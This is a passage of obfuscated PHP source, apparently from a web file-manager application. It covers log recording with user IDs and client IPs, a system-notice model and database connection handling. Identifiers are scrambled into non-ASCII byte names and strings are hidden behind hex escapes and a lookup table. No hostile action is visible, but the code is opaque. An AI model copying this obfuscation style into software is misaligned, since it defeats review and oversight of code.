=> LNG($‹şÊ·Ò¥[2240]), $‹şÊ·Ò¥[2241] => LNG($‹şÊ·Ò¥[2242]), $‹şÊ·Ò¥[2243] => LNG($‹şÊ·Ò¥[2244]), $‹şÊ·Ò¥[2245] => LNG($‹şÊ·Ò¥[2246]), $‹şÊ·Ò¥[2247] => LNG($‹şÊ·Ò¥[2248]), $‹şÊ·Ò¥[2249] => LNG($‹şÊ·Ò¥[2249]), $‹şÊ·Ò¥[2250] => LNG($‹şÊ·Ò¥[2251]), $‹şÊ·Ò¥[2252] => LNG($‹şÊ·Ò¥[2253]), $‹şÊ·Ò¥[2254] => LNG($‹şÊ·Ò¥[2255]), $‹şÊ·Ò¥[2256] => LNG($‹şÊ·Ò¥[2257]), $‹şÊ·Ò¥[2258] => LNG($‹şÊ·Ò¥[2259]), $‹şÊ·Ò¥[2260] => LNG($‹şÊ·Ò¥[2261])); } private function typeFile() { $ìœôŠÂä =& $_SERVER[Ì¥ŞÒ°£]; $öø‰“® = array($ìœôŠÂä[1835] => array($ìœôŠÂä[1836]), $ìœôŠÂä[2203] => array($ìœôŠÂä[2262]), $ìœôŠÂä[2205] => array($ìœôŠÂä[2263]), $ìœôŠÂä[1828] => array($ìœôŠÂä[1829]), $ìœôŠÂä[2213] => array(), $ìœôŠÂä[2215] => array(), $ìœôŠÂä[2217] => array(), $ìœôŠÂä[1838] => array($ìœôŠÂä[1840]), $ìœôŠÂä[1839] => array($ìœôŠÂä[1840]), $ìœôŠÂä[2221] => array($ìœôŠÂä[2264]), $ìœôŠÂä[2223] => array($ìœôŠÂä[2264]), $ìœôŠÂä[2225] => array($ìœôŠÂä[2265]), $ìœôŠÂä[2211] => array($ìœôŠÂä[2266]), $ìœôŠÂä[1833] => array($ìœôŠÂä[2267]), $ìœôŠÂä[2228] => array($ìœôŠÂä[2268]), $ìœôŠÂä[1832] => array($ìœôŠÂä[1834])); return $öø‰“®; } private function typeAll() { $ªÇ­¹Íô =& $_SERVER[Ì¥ŞÒ°£]; $Š” û«ú = $this->typeList; $²º £¥¤ = array_filter($this->typeFile()); foreach ($²º £¥¤ as $×½·ÁÍ => $ıçë¤¯‰) { $Š” û«ú[$ıçë¤¯‰[0]] = $Š” û«ú[$×½·ÁÍ]; } $Š” û«ú[$ªÇ­¹Íô[1840]] = LNG($ªÇ­¹Íô[2269]); $Š” û«ú[$ªÇ­¹Íô[2264]] = LNG($ªÇ­¹Íô[2270]); return $Š” û«ú; } public function addLog($¦öœŒÍ, $Ì´ÄƒÏ = array()) { $êÒˆèûò =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->typeList[$¦öœŒÍ])) { return; } $íÚë¨… = defined($êÒˆèûò[475]) && USER_ID ? USER_ID : (isset($Ì´ÄƒÏ[$êÒˆèûò[1667]]) ? $Ì´ÄƒÏ[$êÒˆèûò[1667]] : 0); if (!$íÚë¨…) { $íÚë¨… = (int) Session::get($êÒˆèûò[1994]); } if ($¦öœŒÍ == $êÒˆèûò[2239] && is_array($Ì´ÄƒÏ[$êÒˆèûò[2271]]) && !$Ì´ÄƒÏ[$êÒˆèûò[2271]]) { return; } $”¹Ñ¥¬© = get_client_ip(); if (!$Ì´ÄƒÏ || strlen(json_encode($Ì´ÄƒÏ)) >= 1024) { $Ì´ÄƒÏ = array($êÒˆèûò[2272] => $”¹Ñ¥¬©); } else { if (is_array($Ì´ÄƒÏ)) { $Ì´ÄƒÏ[$êÒˆèûò[2272]] = $”¹Ñ¥¬©; } else { $Ì´ÄƒÏ = array($êÒˆèûò[1208] => $Ì´ÄƒÏ, $êÒˆèûò[2272] => $”¹Ñ¥¬©); } } $Ì´ÄƒÏ = array($êÒˆèûò[1657] => Session::sign(), $êÒˆèûò[1658] => $íÚë¨…, $êÒˆèûò[33] => $¦öœŒÍ, $êÒˆèûò[1660] => json_encode($Ì´ÄƒÏ)); parent::add($Ì´ÄƒÏ); } public function remove($ıÙª¨²») { $this->where(array($_SERVER[Ì¥ŞÒ°£][419] => $ıÙª¨²»))->delete(); } private function _makeOrder($æ€Ğµ„ï = '') { $ÚÖáÜæş =& $_SERVER[Ì¥ŞÒ°£]; $Ó¡²ñüò = $ÚÖáÜæş[200]; $êâˆ“† = array($ÚÖáÜæş[450] => $ÚÖáÜæş[451], $ÚÖáÜæş[452] => $ÚÖáÜæş[453]); $”½áÆ±ˆ = Input::get($ÚÖáÜæş[458], $ÚÖáÜæş[7], $ÚÖáÜæş[2026], array($ÚÖáÜæş[1948], $ÚÖáÜæş[452])); $”½áÆ±ˆ = $êâˆ“†[$”½áÆ±ˆ]; $æ€Ğµ„ï = $æ€Ğµ„ï . "{$Ó¡²ñüò}\x20{$”½áÆ±ˆ}"; return $this->order($æ€Ğµ„ï); } public function get($º‘¢ñ°Ã = '') { $Í×­®ßó =& $_SERVER[Ì¥ŞÒ°£]; if (!$º‘¢ñ°Ã) { show_json(array()); } $Ş‹  = array(); if ($º‘¢ñ°Ã[$Í×­®ßó[1667]]) { $Ş‹ [$Í×­®ßó[1667]] = $º‘¢ñ°Ã[$Í×­®ßó[1667]]; } if (isset($º‘¢ñ°Ã[$Í×­®ßó[763]])) { $ë…•ÑÔ = $º‘¢ñ°Ã[$Í×­®ßó[763]]; $å÷ÖÍÕ” = isset($º‘¢ñ°Ã[$Í×­®ßó[497]]) ? $º‘¢ñ°Ã[$Í×­®ßó[497]] : time(); $Ş‹ [$Í×­®ßó[200]] = array($Í×­®ßó[333], array($ë…•ÑÔ, $å÷ÖÍÕ”)); } if ($º‘¢ñ°Ã[$Í×­®ßó[33]]) { $Å·Û÷ = explode($Í×­®ßó[50], $º‘¢ñ°Ã[$Í×­®ßó[33]]); $€¡ÈÂÍö = $this->typeFile(); $•ı†ÑÊŠ = array(); foreach ($Å·Û÷ as $Ì¢›¦š) { $•ı†ÑÊŠ[] = $Ì¢›¦š; if (isset($€¡ÈÂÍö[$Ì¢›¦š])) { $•ı†ÑÊŠ = array_merge($•ı†ÑÊŠ, $€¡ÈÂÍö[$Ì¢›¦š]); } } $•ı†ÑÊŠ = array_unique($•ı†ÑÊŠ); if ($•ı†ÑÊŠ) { $Ş‹ [$Í×­®ßó[33]] = array($Í×­®ßó[7], $•ı†ÑÊŠ); } } else { $Ş‹ [$Í×­®ßó[33]] = array($Í×­®ßó[2273], $Í×­®ßó[2274]); } if (!empty($º‘¢ñ°Ã[$Í×­®ßó[2272]])) { $Ş‹ [$Í×­®ßó[453]] = array($Í×­®ßó[383], "\45{$º‘¢ñ°Ã[$Í×­®ßó[2272]]}\45"); } $¶¼„Ç¿ = $this->_makeOrder()->where($Ş‹ )->selectPage(); if (empty($¶¼„Ç¿[$Í×­®ßó[369]])) { show_json(array(), !0, $¶¼„Ç¿[$Í×­®ßó[366]]); } $¶¼„Ç¿[$Í×­®ßó[369]] = $this->logList($¶¼„Ç¿[$Í×­®ßó[369]]); return $¶¼„Ç¿; } private function ipAddress(&$½ğ•ß˜) { $±”à§ÜÃ =& $_SERVER[Ì¥ŞÒ°£]; if (!empty($½ğ•ß˜[$±”à§ÜÃ[2272]])) { $‘Ğª»â» = IpLocation::get($½ğ•ß˜[$±”à§ÜÃ[2272]]); } else { $‘Ğª»â» = LNG($±”à§ÜÃ[2275]); } $½ğ•ß˜[$±”à§ÜÃ[2276]] = $‘Ğª»â»; } private function descZipDownload($±šã´µ, &$óé¥“Û¯) { $¤¥îı’× =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($±šã´µ[$¤¥îı’×[2277]])) { return; } $ÊòÊÀª = json_decode($±šã´µ[$¤¥îı’×[2277]], !0); foreach ($ÊòÊÀª as $¶ıç¥„‰) { try { $€Åìõ†Â = IO::infoFull($¶ıç¥„‰[$¤¥îı’×[84]]); } catch (Exception $öç«Ş£) { continue; } $±šã´µ[$¤¥îı’×[84]] = $¶ıç¥„‰[$¤¥îı’×[84]]; $óé¥“Û¯[] = $±šã´µ[$¤¥îı’×[402]] = $€Åìõ†Â[$¤¥îı’×[402]]; $óé¥“Û¯[] = $±šã´µ[$¤¥îı’×[2080]] = $€Åìõ†Â[$¤¥îı’×[432]]; break; } return $±šã´µ; } private function getSourceList(&$úÛÊçŞı) { $Ç½Ä‡èİ =& $_SERVER[Ì¥ŞÒ°£]; $öå¹³—š = array(); foreach ($úÛÊçŞı as $Ÿ§ö®Ú => $°§×ÙÅ) { $÷úìŞÒ = json_decode($°§×ÙÅ[$Ç½Ä‡èİ[453]], !0); if ($°§×ÙÅ[$Ç½Ä‡èİ[33]] == $Ç½Ä‡èİ[1831]) { $÷úìŞÒ = $this->descZipDownload($÷úìŞÒ, $öå¹³—š); $úÛÊçŞı[$Ÿ§ö®Ú][$Ç½Ä‡èİ[453]] = json_encode($÷úìŞÒ); continue; } if (strpos($°§×ÙÅ[$Ç½Ä‡èİ[33]], $Ç½Ä‡èİ[2082]) !== 0) { if (!isset($÷úìŞÒ[$Ç½Ä‡èİ[84]]) || strpos($°§×ÙÅ[$Ç½Ä‡èİ[33]], $Ç½Ä‡èİ[2278]) !== 0) { continue; } try { $¶ŸÊ‹Í† = IO::infoFull($÷úìŞÒ[$Ç½Ä‡èİ[84]]); } catch (Exception $²Èë°ô£) { continue; } $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[402]] = $¶ŸÊ‹Í†[$Ç½Ä‡èİ[402]]; $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[2080]] = $¶ŸÊ‹Í†[$Ç½Ä‡èİ[432]]; $úÛÊçŞı[$Ÿ§ö®Ú][$Ç½Ä‡èİ[453]] = json_encode($÷úìŞÒ); continue; } $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[402]]; $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[2080]]; if ($÷úìŞÒ[$Ç½Ä‡èİ[33]] == $Ç½Ä‡èİ[557]) { $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[453]][$Ç½Ä‡èİ[1165]]; $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[453]][$Ç½Ä‡èİ[1166]]; } if ($÷úìŞÒ[$Ç½Ä‡èİ[33]] == $Ç½Ä‡èİ[2090]) { $öå¹³—š[] = $÷úìŞÒ[$Ç½Ä‡èİ[453]][$Ç½Ä‡èİ[402]]; } } if (!$öå¹³—š) { return array(); } return Model($Ç½Ä‡èİ[827])->sourceListInfo($öå¹³—š, !0); } private function logList($—Šñã‰) { $¹ı°¸å =& $_SERVER[Ì¥ŞÒ°£]; $†¸ÀÇ³ë = array_to_keyvalue($—Šñã‰, $¹ı°¸å[12], $¹ı°¸å[1667]); $òëˆşŸ¶ = Model($¹ı°¸å[535])->userListInfo(array_unique($†¸ÀÇ³ë)); $ôŞËïÖÚ = $this->getSourceList($—Šñã‰); $ƒÎ”™§§ = $this->typeAll(); $¶İüÂøÁ = array(); $ƒ˜—Ÿš = array(); foreach ($—Šñã‰ as $öåêè’ô => $Ã´¹ø—â) { $äæÜı² = $Ã´¹ø—â[$¹ı°¸å[33]]; $«ğ«Ôİ¶ = isset($òëˆşŸ¶[$Ã´¹ø—â[$¹ı°¸å[1667]]]) ? $òëˆşŸ¶[$Ã´¹ø—â[$¹ı°¸å[1667]]] : !1; $Ç„¥¡Œ« = strpos($äæÜı², $¹ı°¸å[2279]) === 0 ? LNG($¹ı°¸å[2280]) : LNG($¹ı°¸å[2275]); $Ã´¹ø—â[$¹ı°¸å[32]] = isset($«ğ«Ôİ¶[$¹ı°¸å[32]]) ? $«ğ«Ôİ¶[$¹ı°¸å[32]] : LNG($¹ı°¸å[2275]); $Ã´¹ø—â[$¹ı°¸å[542]] = isset($«ğ«Ôİ¶[$¹ı°¸å[542]]) ? $«ğ«Ôİ¶[$¹ı°¸å[542]] : $¹ı°¸å[12]; $Ã´¹ø—â[$¹ı°¸å[1567]] = isset($ƒÎ”™§§[$äæÜı²]) ? $ƒÎ”™§§[$äæÜı²] : $Ç„¥¡Œ«; $Ã´¹ø—â[$¹ı°¸å[2025]] = $«ğ«Ôİ¶; $ìéÃ½î• = json_decode($Ã´¹ø—â[$¹ı°¸å[453]], !0); $Ã´¹ø—â[$¹ı°¸å[2272]] = isset($ìéÃ½î•[$¹ı°¸å[2272]]) ? $ìéÃ½î•[$¹ı°¸å[2272]] : $¹ı°¸å[12]; $Ã´¹ø—â[$¹ı°¸å[2276]] = IpLocation::get($Ã´¹ø—â[$¹ı°¸å[2272]]); if (strpos($äæÜı², $¹ı°¸å[2082]) === 0 || isset($ìéÃ½î•[$¹ı°¸å[2080]])) { $ìéÃ½î•[$¹ı°¸å[86]] = $ôŞËïÖÚ[$ìéÃ½î•[$¹ı°¸å[402]]]; $ìéÃ½î•[$¹ı°¸å[2095]] = $ôŞËïÖÚ[$ìéÃ½î•[$¹ı°¸å[2080]]]; if ($ìéÃ½î•[$¹ı°¸å[33]] == $¹ı°¸å[557]) { $ìéÃ½î•[$¹ı°¸å[453]][$¹ı°¸å[1165]] = $ôŞËïÖÚ[$ìéÃ½î•[$¹ı°¸å[453]][$¹ı°¸å[1165]]]; $ìéÃ½î•[$¹ı°¸å[453]][$¹ı°¸å[1166]] = $ôŞËïÖÚ[$ìéÃ½î•[$¹ı°¸å[453]][$¹ı°¸å[1166]]]; } if ($ìéÃ½î•[$¹ı°¸å[33]] == $¹ı°¸å[2090]) { $ìéÃ½î•[$¹ı°¸å[453]][$¹ı°¸å[402]] = $ôŞËïÖÚ[$ìéÃ½î•[$¹ı°¸å[453]][$¹ı°¸å[402]]]; } if ($ìéÃ½î•[$¹ı°¸å[33]] == $¹ı°¸å[1826]) { $ìéÃ½î•[$¹ı°¸å[2095]] = $ìéÃ½î•[$¹ı°¸å[86]]; $ìéÃ½î•[$¹ı°¸å[2080]] = $ìéÃ½î•[$¹ı°¸å[2095]][$¹ı°¸å[402]]; $ìéÃ½î•[$¹ı°¸å[86]] = !1; $ìéÃ½î•[$¹ı°¸å[402]] = $¹ı°¸å[12]; } if ($ìéÃ½î•[$¹ı°¸å[86]] && $ìéÃ½î•[$¹ı°¸å[86]][$¹ı°¸å[411]] == $¹ı°¸å[1290]) { $ƒ˜—Ÿš[] = $Ã´¹ø—â[$¹ı°¸å[399]]; unset($—Šñã‰[$öåêè’ô]); continue; } if ($ìéÃ½î•[$¹ı°¸å[2095]] && $ìéÃ½î•[$¹ı°¸å[2095]][$¹ı°¸å[411]] == $¹ı°¸å[1290]) { $ƒ˜—Ÿš[] = $Ã´¹ø—â[$¹ı°¸å[399]]; unset($—Šñã‰[$öåêè’ô]); continue; } } $Ã´¹ø—â[$¹ı°¸å[453]] = $ìéÃ½î•; unset($Ã´¹ø—â[$¹ı°¸å[2281]]); $¶İüÂøÁ[] = $Ã´¹ø—â; } $this->clearSystemPathLog($ƒ˜—Ÿš); return $¶İüÂøÁ; } private function clearSystemPathLog($çùúÀ§…) { $¢×¥ Ÿ” =& $_SERVER[Ì¥ŞÒ°£]; if (count($çùúÀ§…) == 0) { return; } $â­µ¹²„ = array($¢×¥ Ÿ”[399] => array($¢×¥ Ÿ”[7], array_unique($çùúÀ§…))); $this->where($â­µ¹²„)->delete(); } public function deviceList($Õú§‰Œ¤, $’«³»ŞÁ = 0) { $³”Õ³ =& $_SERVER[Ì¥ŞÒ°£]; $ôÎé‡–Œ = array($³”Õ³[1667] => $Õú§‰Œ¤, $³”Õ³[200] => array($³”Õ³[1019], $’«³»ŞÁ), $³”Õ³[33] => $³”Õ³[1800]); $í¶úâ¶Ğ = array(); $»––šòÒ = $this->field($³”Õ³[2282])->where($ôÎé‡–Œ)->order($³”Õ³[2093])->limit(50)->select(); foreach ($»––šòÒ as $™Í‹ù¨ => $·ù«©•) { if ($™Í‹ù¨ > 0 && abs($·ù«©•[$³”Õ³[200]] - $»––šòÒ[$™Í‹ù¨ - 1][$³”Õ³[200]]) < 5) { continue; } $Çê“®Ë• = json_decode($·ù«©•[$³”Õ³[453]], !0); $·ù«©•[$³”Õ³[2272]] = isset($Çê“®Ë•[$³”Õ³[2272]]) ? $Çê“®Ë•[$³”Õ³[2272]] : $³”Õ³[12]; unset($Çê“®Ë•[$³”Õ³[2272]]); $˜òáÇ¬² = $this->deviceType($Çê“®Ë•[$³”Õ³[2083]]); if (isset($í¶úâ¶Ğ[$˜òáÇ¬²])) { continue; } $·ù«©•[$³”Õ³[2276]] = IpLocation::get($·ù«©•[$³”Õ³[2272]]); $·ù«©•[$³”Õ³[453]] = $Çê“®Ë•; $í¶úâ¶Ğ[$˜òáÇ¬²] = $·ù«©•; } return array_values($í¶úâ¶Ğ); } public function deviceType($ÕšïÁ¢ˆ) { return $ÕšïÁ¢ˆ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x6e\x6f\x74\151\143\x65\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\143\x6f\156\x74\x65\156\164", "\141\165\x74\150", "\155\157\x64\x65", "\164\151\x6d\x65", "\164\x79\160\145", "\x6c\145\166\x65\154", "\x65\x6e\x61\142\154\145", "\163\x6f\162\164"); public function listData($´ˆ¯½áª = false, $í­”»ÖÇ = "\163\x6f\162\164", $ÇÂòŞó = false) { return parent::listData($´ˆ¯½áª, $í­”»ÖÇ, $ÇÂòŞó); } public function add($ƒÌ©Şğİ) { $ìĞœŠ† =& $_SERVER[Ì¥ŞÒ°£]; $ûŒ»Ä¦ = time(); if ($ƒÌ©Şğİ[$ìĞœŠ†[16]] == $ìĞœŠ†[2283]) { $ûŒ»Ä¦ = strtotime($ƒÌ©Şğİ[$ìĞœŠ†[203]]); } $ƒÌ©Şğİ[$ìĞœŠ†[203]] = $ûŒ»Ä¦; return parent::insert($ƒÌ©Şğİ); } public function update($¶ª°”³Ò, $ÔòÅÑí«) { $©êû˜Ÿ“ =& $_SERVER[Ì¥ŞÒ°£]; $½ª¢²úö = $this->listData($¶ª°”³Ò); if (!$½ª¢²úö) { return !1; } $èñşÀÇÂ = time(); if ($ÔòÅÑí«[$©êû˜Ÿ“[16]] == $©êû˜Ÿ“[2283]) { $èñşÀÇÂ = strtotime($ÔòÅÑí«[$©êû˜Ÿ“[203]]); } $ÔòÅÑí«[$©êû˜Ÿ“[203]] = $èñşÀÇÂ; return parent::update($¶ª°”³Ò, $ÔòÅÑí«); } public function remove($Öã¹ñğ) { $Å±äé¸¹ = $this->listData($Öã¹ñğ); if (!$Å±äé¸¹ || $Å±äé¸¹[$_SERVER[Ì¥ŞÒ°£][1290]]) { return !1; } return parent::remove($Öã¹ñğ); } public function sort($ÄÜ‡Ö»², $·á‡ĞÇ³) { return parent::update($ÄÜ‡Ö»², $·á‡ĞÇ³); } public function enable($Û‡«Á, $¤æ£é›) { return parent::update($Û‡«Á, array($_SERVER[Ì¥ŞÒ°£][2284] => $¤æ£é›)); } private function initUserOption() { $×’…±— =& $_SERVER[Ì¥ŞÒ°£]; $this->optionType = $×’…±—[2285]; $this->modelType = $×’…±—[2286]; $this->field = array($×’…±—[2287], $×’…±—[32], $×’…±—[203], $×’…±—[33], $×’…±—[2288], $×’…±—[752], $×’…±—[195]); } public function userNoticeGet($ĞøûóÇ¸ = false) { $this->initUserOption(); return parent::listData($ĞøûóÇ¸, $_SERVER[Ì¥ŞÒ°£][399], !0); } public function userNoticeAdd($Ã¦ğù) { $æºòÌŒ¹ =& $_SERVER[Ì¥ŞÒ°£]; $this->initUserOption(); $ÉƒŞßŠ = $this->findByKey($æºòÌŒ¹[2287], $Ã¦ğù[$æºòÌŒ¹[399]]); if ($ÉƒŞßŠ) { return !0; } $×İ€¸ = array($æºòÌŒ¹[2287] => $Ã¦ğù[$æºòÌŒ¹[399]], $æºòÌŒ¹[32] => $Ã¦ğù[$æºòÌŒ¹[32]], $æºòÌŒ¹[203] => $Ã¦ğù[$æºòÌŒ¹[203]], $æºòÌŒ¹[33] => isset($Ã¦ğù[$æºòÌŒ¹[33]]) ? $Ã¦ğù[$æºòÌŒ¹[33]] : 1, $æºòÌŒ¹[2288] => isset($Ã¦ğù[$æºòÌŒ¹[2288]]) ? $Ã¦ğù[$æºòÌŒ¹[2288]] : 0, $æºòÌŒ¹[752] => 0, $æºòÌŒ¹[195] => 0); return parent::insert($×İ€¸); } public function userNoticeEdit($±ÕÆÄìÜ, $‰™õ¡°†) { $this->initUserOption(); return parent::update($±ÕÆÄìÜ, $‰™õ¡°†); } } goto f¶»˜ÜÌ‹ç; Cˆ¢İ¢é¥¥: class DbSqlite3 extends DbSqlite3Base { public function query($±»ê«¯) { $¢·›Áù =& $_SERVER[Ì¥ŞÒ°£]; if (!CacheLock::fileLock($¢·›Áù[13])) { return !1; } $µæö‹Î = parent::query($±»ê«¯); CacheLock::fileUnLock($¢·›Áù[13]); return $µæö‹Î; } public function execute($Šâøãäİ) { $îæÆƒÍ¯ =& $_SERVER[Ì¥ŞÒ°£]; if (!CacheLock::fileLock($îæÆƒÍ¯[13])) { return !1; } $˜í‘ìš‚ = parent::execute($Šâøãäİ); CacheLock::fileUnLock($îæÆƒÍ¯[13]); return $˜í‘ìš‚; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\161" => "\x3c\x3e", "\147\x74" => "\76", "\x65\147\164" => "\x3e\x3d", "\154\x74" => "\x3c", "\145\x6c\x74" => "\x3c\x3d", "\x6e\x6f\x74\x6c\151\153\x65" => "\116\x4f\x54\40\114\111\113\x45", "\x6c\x69\153\x65" => "\x4c\x49\x4b\x45", "\151\156" => "\x49\116", "\156\157\x74\x69\156" => "\x4e\117\x54\40\111\116", "\156\157\x74\x20\x69\x6e" => "\x4e\117\124\40\111\x4e", "\x62\x65\164\x77\145\145\x6e" => "\102\x45\124\x57\x45\105\x4e", "\156\x6f\x74\x62\145\x74\x77\145\145\156" => "\x4e\x4f\x54\40\102\x45\124\x57\x45\105\116", "\156\157\164\x20\x62\x65\164\167\145\x65\x6e" => "\x4e\x4f\124\x20\x42\105\x54\x57\x45\x45\116"); protected $selectSql = "\x53\105\x4c\x45\103\x54\x25\104\111\123\x54\111\116\x43\x54\45\x20\x25\x46\111\105\114\x44\x25\x20\106\122\x4f\115\x20\x25\x54\101\102\114\105\x25\x25\112\x4f\111\x4e\45\x25\127\110\105\x52\105\x25\45\107\122\x4f\x55\120\x25\x25\x48\x41\126\111\116\x47\x25\45\x4f\x52\x44\105\122\45\x25\114\111\115\x49\x54\45\x20\x25\125\x4e\111\117\116\45\x25\x43\x4f\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $»¸‹Õñ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ì¥ŞÒ°£][965], $»¸‹Õñ); } public function factory($°–¿õœß = '') { $üÏî…»° =& $_SERVER[Ì¥ŞÒ°£]; $°–¿õœß = $this->parseConfig($°–¿õœß); if (empty($°–¿õœß[$üÏî…»°[966]])) { think_exception(think_lang($üÏî…»°[967])); } $this->dbType = ucwords(strtolower($°–¿õœß[$üÏî…»°[966]])); $µÍ—Ó…¹ = $üÏî…»°[968] . $this->dbType; if (class_exists($µÍ—Ó…¹)) { $ÈÅÄÒÔí = new $µÍ—Ó…¹($°–¿õœß); if ($üÏî…»°[969] != strtolower($°–¿õœß[$üÏî…»°[966]])) { $ÈÅÄÒÔí->dbType = strtoupper($this->dbType); } else { $ÈÅÄÒÔí->dbType = $this->_getDsnType($°–¿õœß[$üÏî…»°[921]]); } } else { think_exception(think_lang($üÏî…»°[970]) . $üÏî…»°[971] . $µÍ—Ó…¹); } return $ÈÅÄÒÔí; } public function __call($èÒó·Œë, $™Øş¥‹Ö) { if (method_exists($this, $èÒó·Œë)) { return call_user_func_array(array($this, $èÒó·Œë), $™Øş¥‹Ö); } } protected function _getDsnType($„˜‹…¹) { $—´…¬Àù = explode($_SERVER[Ì¥ŞÒ°£][4], $„˜‹…¹); $ÖùÙı¦Ñ = strtoupper(trim($—´…¬Àù[0])); return $ÖùÙı¦Ñ; } private function parseConfig($³·íæûÖ = '') { $ùõìÃéó =& $_SERVER[Ì¥ŞÒ°£]; if (!empty($³·íæûÖ) && is_string($³·íæûÖ)) { $³·íæûÖ = $this->parseDSN($³·íæûÖ); } elseif (is_array($³·íæûÖ)) { $³·íæûÖ = array_change_key_case($³·íæûÖ); $³·íæûÖ = array($ùõìÃéó[966] => $³·íæûÖ[$ùõìÃéó[972]], $ùõìÃéó[891] => $³·íæûÖ[$ùõìÃéó[973]], $ùõìÃéó[892] => $³·íæûÖ[$ùõìÃéó[974]], $ùõìÃéó[889] => $³·íæûÖ[$ùõìÃéó[975]], $ùõìÃéó[890] => $³·íæûÖ[$ùõìÃéó[976]], $ùõìÃéó[21] => $³·íæûÖ[$ùõìÃéó[977]], $ùõìÃéó[921] => $³·íæûÖ[$ùõìÃéó[978]], $ùõìÃéó[17] => isset($³·íæûÖ[$ùõìÃéó[979]]) ? $³·íæûÖ[$ùõìÃéó[979]] : array()); } elseif (empty($³·íæûÖ)) { if (think_config($ùõìÃéó[980]) && $ùõìÃéó[969] != strtolower(think_config($ùõìÃéó[981]))) { $³·íæûÖ = $this->parseDSN(think_config($ùõìÃéó[980])); } else { $³·íæûÖ = array($ùõìÃéó[966] => think_config($ùõìÃéó[981]), $ùõìÃéó[891] => think_config($ùõìÃéó[982]), $ùõìÃéó[892] => think_config($ùõìÃéó[983]), $ùõìÃéó[889] => think_config($ùõìÃéó[984]), $ùõìÃéó[890] => think_config($ùõìÃéó[985]), $ùõìÃéó[21] => think_config($ùõìÃéó[246]), $ùõìÃéó[921] => think_config($ùõìÃéó[980]), $ùõìÃéó[17] => think_config($ùõìÃéó[986])); } } return $³·íæûÖ; } protected function initConnect($šöæõ˜è = true) { if (1 == think_config($_SERVER[Ì¥ŞÒ°£][22])) { $this->_linkID = $this->multiConnect($šöæõ˜è); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Šê®›¾ => $×¢ŞÖ º) { $this->_linkID = $×¢ŞÖ º; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($à¼ÒàŸé = false) { $­‘²ô€í =& $_SERVER[Ì¥ŞÒ°£]; static $ÉúÇÀë = array(); static $³®š¦Ï = -1; if (empty($ÉúÇÀë)) { foreach ($this->config as $€ó¦¬“À => $ıô–á¸í) { $ÉúÇÀë[$€ó¦¬“À] = explode($­‘²ô€í[50], $ıô–á¸í); } } if (think_config($­‘²ô€í[987])) { if ($à¼ÒàŸé || think_config($­‘²ô€í[395]) === !0) { $ò™Ó­­  = floor(mt_rand(0, think_config($­‘²ô€í[988]) - 1)); $³®š¦Ï = $ò™Ó­­ ; } else { if (is_numeric(think_config($­‘²ô€í[989]))) { $ò™Ó­­  = think_config($­‘²ô€í[989]); } else { $ò™Ó­­  = floor(mt_rand(think_config($­‘²ô€í[988]), count($ÉúÇÀë[$­‘²ô€í[889]]) - 1)); } } } else { $ò™Ó­­  = floor(mt_rand(0, count($ÉúÇÀë[$­‘²ô€í[889]]) - 1)); $³®š¦Ï = $ò™Ó­­ ; } $ò™Ó­­  = $³®š¦Ï !== -1 ? $³®š¦Ï : $ò™Ó­­ ; $¬½¿ÎøÆ = array($­‘²ô€í[891] => isset($ÉúÇÀë[$­‘²ô€í[891]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[891]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[891]][0], $­‘²ô€í[892] => isset($ÉúÇÀë[$­‘²ô€í[892]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[892]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[892]][0], $­‘²ô€í[889] => isset($ÉúÇÀë[$­‘²ô€í[889]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[889]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[889]][0], $­‘²ô€í[890] => isset($ÉúÇÀë[$­‘²ô€í[890]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[890]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[890]][0], $­‘²ô€í[21] => isset($ÉúÇÀë[$­‘²ô€í[21]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[21]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[21]][0], $­‘²ô€í[921] => isset($ÉúÇÀë[$­‘²ô€í[921]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[921]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[921]][0], $­‘²ô€í[17] => isset($ÉúÇÀë[$­‘²ô€í[17]][$ò™Ó­­ ]) ? $ÉúÇÀë[$­‘²ô€í[17]][$ò™Ó­­ ] : $ÉúÇÀë[$­‘²ô€í[17]][0]); return $this->connect($¬½¿ÎøÆ, $ò™Ó­­ ); } public function parseDSN($Î¨ÌºÆ) { $üßú¹í =& $_SERVER[Ì¥ŞÒ°£]; if (empty($Î¨ÌºÆ)) { return !1; } $½ö¡”’ = parse_url($Î¨ÌºÆ); if ($½ö¡”’[$üßú¹í[180]]) { $¦Âıˆ·ñ = array($üßú¹í[966] => 